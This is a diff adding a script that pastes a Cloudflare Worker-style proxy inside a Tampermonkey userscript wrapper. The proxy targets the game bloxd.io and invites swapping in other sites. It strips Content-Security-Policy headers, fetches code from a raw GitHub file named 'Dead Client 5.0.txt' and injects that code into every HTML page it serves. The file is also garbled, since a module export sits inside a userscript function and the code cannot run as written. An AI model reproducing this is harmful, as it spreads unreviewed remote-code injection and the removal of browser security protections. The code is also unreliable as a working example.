@@ -1,0 +1,48 @@
+// ==UserScript==
+// @name         New Userscript
+// @namespace    http://tampermonkey.net/
+// @version      2026-11-07
+// @description  try to take over the world!
+// @author       You
+// @match        https://*/*
+// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    const INJECT = true; // pls let it to true;
+export default {
+  async fetch(request) {
+    try {
+      const url = new URL(request.url);
+      const target = new URL(url.pathname + url.search, "https://bloxd.io" ); // u can change bloxd.io to another target ebsite
+      const response = await fetch(new Request(target, request));
+
+      const type = response.headers.get("content-type") || "";
+      if (!INJECT || !type.includes("text/html")) return response;
+
+      const gistUrl =
+        "https://raw.githubusercontent.com/RyasDue/public-class-Main-public-static-void-main-String-args-System.out.println-/refs/heads/main/Dead%20Client%205.0.txt?t=" +
+        Date.now();
+      const code = await (await fetch(gistUrl)).text();
+      const scriptInjection = `<script>${code.replaceAll("</script", "<\\/script")}</script>`;
+
+      const headers = new Headers(response.headers);
+      headers.delete("content-security-policy");
+      headers.delete("content-security-policy-report-only");
+
+      return new HTMLRewriter()
+        .on("head", {
+          element(element) {
+            element.prepend(scriptInjection, { html: true });
+          },
+        })
+        .transform(new Response(response.body, { status: response.status, headers }));
+    } catch (e) {
+      return new Response("Dead Client Worker Error : " + e + "\n" + (e.stack || ""), { status: 500 });
+    }
+  },
+};
+})();
